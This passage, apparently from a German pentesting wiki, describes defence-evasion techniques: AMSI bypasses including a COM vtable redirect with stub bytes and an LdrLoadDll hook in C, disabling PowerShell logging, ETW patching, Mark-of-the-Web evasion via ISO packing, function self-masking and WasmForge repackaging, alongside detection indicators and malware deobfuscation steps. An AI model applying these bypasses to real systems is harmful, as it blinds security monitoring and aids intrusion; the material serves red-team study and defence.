Es gibt auch viele weitere Techniken, um AMSI mit PowerShell zu umgehen. Weitere Informationen findest du auf [**dieser Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und in [**diesem Repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### AMSI-COM-Scan-Pointer-Umleitung statt `AmsiScanBuffer`-Patchen

Ein weiterer prozesslokaler Bypass lässt den Einstiegspunkt `AmsiScanBuffer` unangetastet. Im beschriebenen 64-Bit-.NET-Loader wird ein AMSI-COM-Objekt mit der CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec` erstellt; `Marshal.GetIUnknownForObject()` liefert den Interface-Pointer, und sein vtable-Slot am Offset `0x18` wird als Ziel des Scan-Aufrufs verwendet. Der Loader patcht einen nativen Pointer für `Console.Clear()` mit einem kleinen x64-Stub, ändert diesen vtable-Eintrag unter Verwendung von `VirtualProtect()` auf den Stub und stellt anschließend den ursprünglichen Seitenschutz wieder her. Voraussetzung sind sowohl die 64-Bit-Pointerbreite als auch das erwartete COM-Layout; dies ist kein allgemeiner Offset für beliebige AMSI-Interfaces oder Builds. Die zuvor beobachteten Phasen sind das [Laden eines signierten AppDomainManager-Sidecars](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) und die [RESX-Deserialisierung](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Die beobachteten Stub-Bytes lauten `41 C7 00 01 00 00 00 33 C0 C3`: Sie schreiben **1** in den Ergebnispointer in `r8` und geben **0** in `eax` zurück. Daher vermischt die dokumentierte Behauptung, das Scan-Ergebnis sei `AMSI_RESULT_CLEAN` (0), den Rückgabewert `S_OK` mit dem Ausgabe-Enum. In der dokumentierten Reihenfolge von `AMSI_RESULT` entspricht Ergebnis **1** `AMSI_RESULT_NOT_DETECTED`; es liegt weiterhin unterhalb der Erkennungsschwelle.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll-Hook)

AMSI wird erst initialisiert, nachdem amsi.dll in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen und für diesen Prozess werden keine Scans durchgeführt.<sup>[[23]](#references)</sup>

Implementierungsübersicht (x64-C/C++-Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Hinweise
- Funktioniert gleichermaßen mit PowerShell, WScript/CScript und benutzerdefinierten Loadern (alle, die andernfalls AMSI laden würden).
- Kombinieren Sie dies mit dem Übergeben von Skripten über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Befehlszeilen-Artefakte zu vermeiden.
- Wurde bei Loadern beobachtet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Das Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generiert ebenfalls Skripte zum Umgehen von AMSI.
Das Tool **[https://amsibypass.com/](https://amsibypass.com/)** generiert ebenfalls Skripte zum Umgehen von AMSI, die Signaturen vermeiden, indem sie zufällige benutzerdefinierte Funktionen, Variablen und Zeichenausdrücke verwenden und die Groß-/Kleinschreibung von PowerShell-Schlüsselwörtern zufällig variieren, um Signaturen zu umgehen.

**Die erkannte Signatur entfernen**

Sie können Tools wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool durchsucht den Speicher des aktuellen Prozesses nach der AMSI-Signatur und überschreibt sie anschließend mit NOP-Anweisungen, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste der AV/EDR-Produkte, die AMSI verwenden, finden Sie unter **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell-Version 2 verwenden**
Wenn Sie PowerShell-Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne dass sie von AMSI gescannt werden. Das geht so:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell-Logging ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Das kann für Audits und die Fehlerbehebung nützlich sein, aber auch ein **Problem für Angreifer darstellen, die einer Erkennung entgehen wollen**.

Um PowerShell-Logging zu umgehen, kannst du die folgenden Techniken verwenden:

- **PowerShell Transcription und Module Logging deaktivieren**: Dafür kannst du ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **PowerShell Version 2 verwenden**: Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne dass sie von AMSI gescannt werden. Dazu kannst du Folgendes verwenden: `powershell.exe -version 2`
- **Eine nicht verwaltete PowerShell-Sitzung verwenden**: Verwende [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um PowerShell zu hosten, ohne `powershell.exe` zu starten (der von Cobalt Strikes `powerpick` verwendete Ansatz). Dadurch werden Kontrollen umgangen, die speziell an den Prozess `powershell.exe` gebunden sind. AMSI, Script Block Logging oder andere PowerShell-Abwehrmaßnahmen werden dadurch jedoch nicht automatisch deaktiviert; die Abdeckung hängt von der Laufzeitumgebung und der Host-Implementierung ab.


## Obfuscation

> [!TIP]
> Mehrere Obfuscation-Techniken beruhen auf der Verschlüsselung von Daten, wodurch die Entropie der Binärdatei steigt und sie für AVs und EDRs leichter erkennbar wird. Sei dabei vorsichtig und wende Verschlüsselung gegebenenfalls nur auf bestimmte Abschnitte deines Codes an, die sensibel sind oder verborgen werden müssen.

### ConfuserEx-geschützte .NET-Binärdateien deobfuscaten

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzebenen, die Decompiler und Sandboxes blockieren. Der folgende Workflow stellt zuverlässig ein nahezu ursprüngliches IL wieder her, das anschließend mit Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.<sup>[[10]](#references)</sup>

1.  Anti-Tampering entfernen – ConfuserEx verschlüsselt jeden *Methodenrumpf* und entschlüsselt ihn im statischen Konstruktor des *Moduls* (`<Module>.cctor`). Außerdem wird die PE-Prüfsumme angepasst, sodass jede Änderung zum Absturz der Binärdatei führt. Verwende **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu finden, die XOR-Schlüssel wiederherzustellen und eine bereinigte Assembly zu schreiben:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Wiederherstellung von Symbolen und Kontrollfluss – übergib die *bereinigte* Datei an **de4dot-cex** (einen ConfuserEx-fähigen Fork von de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – das ConfuserEx-2-Profil auswählen
     • de4dot hebt Control-Flow-Flattening auf, stellt ursprüngliche Namespaces, Klassen und Variablennamen wieder her und entschlüsselt konstante Zeichenfolgen.

3.  Proxy-call stripping – ConfuserEx ersetzt direkte Methodenaufrufe durch leichtgewichtige Wrapper (auch *Proxy-Aufrufe* genannt), um die Decompilierung weiter zu erschweren. Entferne sie mit **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nach diesem Schritt sollten normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) zu sehen sein.

4.  Manuelle Bereinigung – führe die resultierende Binärdatei in dnSpy aus und suche nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um das *eigentliche* Payload zu finden.  Oft speichert die Malware es als TLV-kodiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Die obige Kette stellt den Ausführungsfluss wieder her, **ohne** dass das bösartige Sample ausgeführt werden muss – nützlich bei der Arbeit auf einer Offline-Workstation.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch einer Triage zu unterziehen.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-Obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/)-Compiler-Suite bereitzustellen, der durch [Code-Obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz die Softwaresicherheit erhöht.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie sich mit der Sprache `C++11/14` zur Compile-Zeit obfuscierter Code generieren lässt, ohne externe Tools zu verwenden oder den Compiler zu ändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Ebene obfuscierter Operationen hinzu, die vom C++-Template-Metaprogramming-Framework generiert werden und es der Person, die die Anwendung knacken möchte, etwas schwerer machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binary-Obfuscator, der verschiedene PE-Dateien obfuscieren kann, darunter: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache Engine für metamorphischen Code für beliebige Executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein Framework für feingranulare Code-Obfuscation für von LLVM unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfusciert ein Programm auf Assembly-Code-Ebene, indem reguläre Instruktionen in ROP-Chains umgewandelt werden. So wird unsere natürliche Vorstellung eines normalen Kontrollflusses untergraben.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein in Nim geschriebener .NET-PE-Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL in Shellcode umwandeln und anschließend laden

### LLVM-compilerunterstützte Selbstmaskierung einzelner Funktionen

Anstatt ein gesamtes Implantat nur während der Ruhephasen zu maskieren, kann ein modifiziertes LLVM-X86-Backend ausgewählte Funktionen XOR-maskiert halten, solange sie inaktiv sind. Der Function-Peekaboo-PoC wählt demangelte Namen aus, die `REG_` enthalten, fügt positionsunabhängige Entry-/Exit-Stubs um den finalen Maschinencode ein und gibt einen gemeinsamen Maskierungshandler in `.text` aus. Signaturen auf Quelltextebene und die Windows-x64-Aufrufkonvention bleiben unverändert.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend-Kontrollfluss-Transformation

Diese Änderung gehört hinter die Instruktionsauswahl und Optimierung, da die Transformation **jeden ausgegebenen Return** erfassen und das exakte x86-Layout kennen muss. Ein `MachineFunctionPass` vor der Codeausgabe findet die letzte `MachineInstr::isReturn()`, löscht sie, sodass der letzte Pfad in den angehängten Epilog fällt, und ersetzt frühere Returns durch `JMP_1 handler`. Compiler-generiertes Stack-/Frame-Teardown vor jedem Return muss erhalten bleiben; umgeleitet wird nur die Return-Instruktion selbst.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` und `X86AsmPrinter::emitFunctionBodyEnd()` geben die funktionsspezifischen Stubs aus, während `emitEndOfAsmFile()` den Handler ausgibt. Symbole, die zwischen den Ausgabeschritten gemeinsam genutzt werden, ermöglichen es, dass ein Prolog-Branch auf seinen späteren Epilog zeigt. Für ein manuell ausgegebenes near-`je` werden `0F 84` und danach der vier Byte große MC-Ausdruck `target - address_after_je` geschrieben. Calls und Jumps zum Handler können stattdessen als `MCInst`-Objekte ausgegeben werden (`CALL64pcrel32` und `JMP_1`). Ein Pass muss für eine nicht ausgewählte Funktion `false` zurückgeben, wenn er nichts geändert hat; der PoC gibt in diesem Fall fälschlicherweise `true` zurück.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadaten und Initialisierung vor dem CRT

Der PoC legt in `.funcmeta` einen XOR-Schlüssel und 16 Byte große Records ab, die einen vom Loader relocatierten Funktionszeiger sowie eine Laufzeitlänge enthalten. Obwohl das C-Feld ein `uint32_t` ist, greift der Handler auf ein QWORD am Record-Offset `+8` zu und liest dabei die Länge samt Padding; anschließend springt er jeweils um `0x10` weiter. PE-Abschnittsnamen sind auf acht Byte begrenzt, daher sieht die Laufzeitabfrage `.funcmet`. Ein externes Patcher-Tool fügt einen ausführbaren Abschnitt `.stub` hinzu, speichert die ursprüngliche Entry-Point-RVA im Stub und leitet `AddressOfEntryPoint` um. Der PIC-Stub ermittelt die Image Base über `gs:[0x60]` → `[PEB+0x10]`, durchläuft die PE32+-Imports, um ein bereits importiertes `VirtualProtect` aufzulösen, und wird vor dem CRT ausgeführt.<sup>[[38]](#references)[[39]](#references)</sup>

Bei der Initialisierung wird in `gs:[0xE8]` ein Sentinel gesetzt und jede Funktion aus den Metadaten aufgerufen. Der dauerhaft lesbare Prolog speichert den Funktionsanfang in `gs:[0xF0]`, erkennt den Sentinel und überspringt den noch unmaskierten Funktionskörper. Der Epilog verwendet dann `call handler`; nachdem der Handler 13 Register (`0x68` Byte) gesichert hat, enthält die Rücksprungadresse bei `[rsp+0x68]` das Ende der transformierten Funktion. Daher kann `end - start` in den Metadaten-Record geschrieben werden. Nachdem alle Funktionskörper maskiert wurden, löscht der Stub den Sentinel und springt zu `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Bei einem normalen Aufruf ruft der Prolog denselben symmetrischen Handler auf, um den Funktionskörper zu decodieren. Der letzte Pfad läuft in den angehängten Epilog, während jeder frühere Return direkt zum gemeinsamen Handler springt. Auch der normale Epilog verwendet `jmp handler` statt `call`. Nach der erneuten Maskierung nimmt das `ret` des Handlers daher die Rücksprungadresse des ursprünglichen Aufrufers und erhält das Funktionsergebnis in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Maskierungsprimitive und Analyseindikatoren

Der Handler findet den aktuellen Record, überspringt den festen sichtbaren Prolog (in diesem Build `0x46` Byte), setzt den restlichen Bereich auf `PAGE_EXECUTE_READWRITE`, XORt ihn Byte für Byte mit dem niederwertigen Schlüsselbyte und setzt ihn anschließend auf `PAGE_EXECUTE_READ`. Dieselbe Schleife decodiert den Funktionskörper beim Eintritt und codiert ihn bei jedem normalen Exit erneut.<sup>[[38]](#references)[[39]](#references)</sup>

Zu den aussagekräftigen Indikatoren für dieses Design gehören:<sup>[[38]](#references)[[39]](#references)</sup>

- ein Entry Point innerhalb eines ausführbaren `.stub`-Abschnitts und ein `.funcmet`-Abschnitt mit einem Schlüssel sowie relocatierten Zeigern auf `.text`;
- PEB-, Importtabellen- und Abschnittstabellen-Parsing vor dem CRT, gefolgt von Aufrufen über jeden Metadatenzeiger;
- identische PIC-Prologe mit `call`/`pop` und zahlreiche Return-Stellen, die zu einem Handler umgeleitet werden;
- Schreibzugriffe auf `gs:[0xE8]`, `gs:[0xF0]` und `gs:[0xF8]`, gefolgt von wiederholten `VirtualProtect`-Übergängen und byteweisen XOR-Schreibzugriffen auf ausführbare, vom Image unterstützte Speicherseiten.

Dies dient der Umgehung von Memory-Scannern, nicht dem kryptografischen Schutz: Die gepatchte Datei enthält weiterhin den ursprünglichen unverschlüsselten Funktionskörper. Ein Debugger kann bei `VirtualProtect` oder der XOR-Schleife anhalten und die aktive Funktion dumpen. Das einzelne XOR-Byte, die lesbaren Metadaten und die feste Grenze `0x46` machen auch eine Offline-Rekonstruktion unkompliziert.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die TEB-Slots des PoC sind threadlokal, die modifizierten Code-Pages jedoch prozessweit. Bei nebenläufigem oder rekursivem Eintritt können Instruktionen daher erneut umgeschaltet werden, während ein anderer Aufruf sie gerade ausführt. Auch Exceptions und nichtlokale Exits können die erneute Maskierung umgehen. Eine robuste Implementierung muss die Übergänge synchronisieren, den über `lpflOldProtect` zurückgegebenen tatsächlichen Seitenschutz wiederherstellen, fest codierte Stub-Längen vermeiden, sowohl `call`- als auch `jmp`-Pfade auf die x64-Stack-Ausrichtung prüfen und nach dem Umschreiben ausführbarer Bytes `FlushInstructionCache` aufrufen. Microsoft überträgt die Verantwortung für die Kohärenz des Instruktionscaches bei Änderungen an ausführbarem Code ausdrücklich dem Aufrufer.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Vielleicht ist dir dieser Bildschirm schon einmal begegnet, wenn du ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt hast.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der Endbenutzer davor schützen soll, potenziell schädliche Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich mit einem reputationsbasierten Ansatz. Das bedeutet, dass selten heruntergeladene Anwendungen SmartScreen auslösen und dadurch den Endbenutzer warnen und daran hindern, die Datei auszuführen (die Datei kann jedoch weiterhin ausgeführt werden, indem man auf „More Info“ -> „Run anyway“ klickt).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird und die URL enthält, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfung des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass mit einem **vertrauenswürdigen** Signaturzertifikat signierte Executables **SmartScreen nicht auslösen**.

Eine sehr effektive Methode, um zu verhindern, dass deine Payloads den Mark of The Web erhalten, besteht darin, sie in eine Art Container wie eine ISO-Datei zu packen. Der Grund dafür ist, dass Mark-of-the-Web (MOTW) **nicht** auf **Nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabe-Container verpackt, um den Mark-of-the-Web zu umgehen.

Beispielverwendung:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads mithilfe von [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) in ISO-Dateien verpackt werden.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsstarker Logging-Mechanismus in Windows, mit dem Anwendungen und Systemkomponenten **Ereignisse protokollieren** können. Sicherheitsprodukte können ihn jedoch auch verwenden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) wird, lässt sich auch die Funktion **`EtwEventWrite`** des User-Space-Prozesses so patchen, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Dazu wird die Funktion im Speicher gepatcht, sodass sie sofort zurückkehrt und damit das ETW-Logging für diesen Prozess effektiv deaktiviert.

Weitere Informationen findest du unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C#-Binaries im Speicher zu laden, ist seit Langem bekannt und nach wie vor eine sehr gute Möglichkeit, deine Post-Exploitation-Tools auszuführen, ohne von AV entdeckt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen. Es gibt jedoch verschiedene Möglichkeiten dafür:

- **Fork\&Run**

Dabei wird **ein neuer sacrificial process gestartet**, der Post-Exploitation-Schadcode in diesen neuen Prozess injiziert und ausgeführt. Nach Abschluss wird der neue Prozess beendet. Diese Methode hat sowohl Vor- als auch Nachteile. Ihr Vorteil ist, dass die Ausführung **außerhalb** unseres Beacon-Implant-Prozesses stattfindet. Das bedeutet, dass unser **Implant eine deutlich höhere Chance hat, zu überleben**, falls bei unserer Post-Exploitation-Aktion etwas schiefgeht oder sie entdeckt wird. Der Nachteil ist, dass die **Wahrscheinlichkeit höher ist**, von **verhaltensbasierten Erkennungen** entdeckt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der Post-Exploitation-Schadcode **in den eigenen Prozess** injiziert. So musst du keinen neuen Prozess erstellen, der anschließend von AV gescannt wird. Der Nachteil ist, dass die **Wahrscheinlichkeit deutlich höher ist**, deinen **Beacon zu verlieren**, wenn bei der Ausführung deiner Payload etwas schiefgeht, da der Prozess abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies erfahren möchtest, lies diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und sieh dir den zugehörigen InlineExecute-Assembly BOF an ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)).

Du kannst C#-Assemblies auch **aus PowerShell** laden. Sieh dir dazu [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [das Video von S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## NativeAOT-WebAssembly-Neuverpackung von .NET-Tools (WasmForge)

Bei normalen `execute-assembly`-Techniken bleibt erkennbares MSIL erhalten, und letztendlich wird eine CLR initialisiert. **WasmForge** ändert stattdessen die Ausführungsumgebung: Es migriert ein C#-Projekt auf das experimentelle NativeAOT-LLVM-WASI-Ziel, kompiliert es vorab zu WebAssembly und bettet dieses Modul in einen Windows-PE-Host auf Basis von Wazero ein. Der resultierende Prozess benötigt weder die CLR des Ziels noch JIT oder `dotnet`-Host. Daher bieten Regeln, die ausschließlich auf verwalteten Assembly-Namen, dem Laden der CLR, AMSI oder .NET ETW basieren, keine direkte Sichtbarkeit mehr. Dies ist eine Umgehungs- und Packaging-Technik, kein Umgehen einer Berechtigungsgrenze – der Gast behält die Berechtigungen und das beobachtbare OS-Verhalten des ursprünglichen Tools bei.<sup>[[44]](#references)[[45]](#references)</sup>

### Erstellen eines C#-Projekts

Der empfohlene Build-Weg ist die Docker-Umgebung des Projekts, da sie das .NET 10 SDK, den NativeAOT-LLVM-Workload, WASI SDK 24.0, den Linker und die Signierungsabhängigkeiten enthält. Eine `.csproj`-Datei wird automatisch erkannt; der Build in einem Schritt übernimmt Migration, Kompatibilitäts-Patching, WASM-Kompilierung, PE-Forging und Signierung.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Zur Fehlerbehebung oder Überprüfung des generierten Codes lässt sich der Prozess in `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` und einen abschließenden Aufruf von `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` aufteilen. Das Build-Image verwendet außerdem einen `wasm-component-ld`-Wrapper, um die WASI-Preview-2-Komponentenkodierung zu vermeiden und das einfache Modul zu erzeugen, das die eingebettete Runtime erwartet.<sup>[[44]](#references)[[45]](#references)</sup>

### Überbrückung von wasm32-C# zu x64-Win32

Dies ist keine transparente Neukompilierung. NativeAOT-WASI unterstützt Windows-orientierte BCL-Funktionen entweder nicht oder verändert sie, und ein wasm32-Gast reserviert normalerweise vier Byte große Zeigerslots, während x64-APIs acht Byte große Zeiger zurückgeben können. WasmForge löst beide Probleme mit den folgenden generierten Ebenen:<sup>[[44]](#references)</sup>

1. Ein Source-Patcher behebt AOT-spezifische semantische Unterschiede und leitet nicht unterstützte Aufrufe für Registry, Pipes, WMI, Identität, Verzeichnisdienste, Dateiversionen, LSA und Ähnliches an `Wf*`-Helfer weiter.
2. Ein P/Invoke-Scanner erzeugt NativeAOT-`DirectPInvoke`-Zuordnungen, damit `[DllImport]`-Aufrufe an gelinkte C-Bridge-Symbole gebunden werden, anstatt die angegebene DLL dynamisch im Gast zu laden.
3. Hostgebundene Zeiger verwenden `ulong` in C# und `uint64_t` in C. Ein generischer Dispatcher leitet den Aufruf an den Win32-Handler des Hosts weiter; ein `out8_mask` markiert echte acht Byte große Ausgabeslots, deren obere Hälften erhalten bleiben müssen. Nicht markierte Ausgaben im wasm32-Format werden durch Snapshot-/Restore-Schutz abgesichert, damit ein x64-Schreibvorgang die angrenzenden vier Byte nicht beschädigt.
4. Dedizierte Host-Bridges übernehmen Operationen, die nicht in die generische Syscall-Dispatch passen, etwa den Zugriff auf den LSA-Ticket-Cache, Kerberos-/BCrypt-Operationen mit strukturierten Ergebnissen, TCP-KDC-Datenverkehr und LDAP-Abfragen.

Ein Wrapper für `version.dll!VerQueryValueW` übergibt beispielsweise vier Hostadressen und setzt die Bits 2 und 3 (`0xC`), da der Wertzeiger und die Länge acht Byte große Ausgabeslots sind. Der Wrapper selbst bleibt generisch und übergibt DLL-Namen, Exportnamen, Argumente und Maske an `wf_call_v2`; der Host übersetzt die Zeiger und ruft die native API auf.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Einschränkungen und Erkennungspunkte

Code mit intensiver Reflection-Nutzung, dynamisches Laden von Assemblies, beliebige native Callbacks und komplexe x64-Strukturen, die in den WASM-Speicher zurückgegeben werden, können weiterhin Patches für einzelne Tools erfordern oder vollständig fehlschlagen. Generische WASI-Preview-2-Sockets können außerdem No-op-Stubs erreichen, daher verwenden unterstützte Tools protokollspezifische Host-Shims. Überprüfe jeden Befehl anhand eines nativen Builds, statt von Feature-Parität auszugehen.<sup>[[44]](#references)[[45]](#references)</sup>

Die Technik verlagert Telemetrie, statt die Payload unsichtbar zu machen. Die Erkennung kann sich auf eine PE-Datei konzentrieren, die ein WASM-Modul enthält oder materialisiert, auf Wazero-ähnliches Laufzeitverhalten, ungewöhnliche Speicherallokation und -kopiervorgänge zwischen Host und Guest, generische direkte Win32-Dispatches, Anomalien bei Signaturen und PE-Ressourcen sowie die daraus resultierenden API-Aufrufe und den Netzwerkverkehr. Das Ausbleiben von CLR-Load-, AMSI- oder .NET-ETW-Ereignissen sollte daher nicht als Beleg dafür gewertet werden, dass ein Prozess harmlos ist.<sup>[[44]](#references)</sup>

## Andere Programmiersprachen verwenden

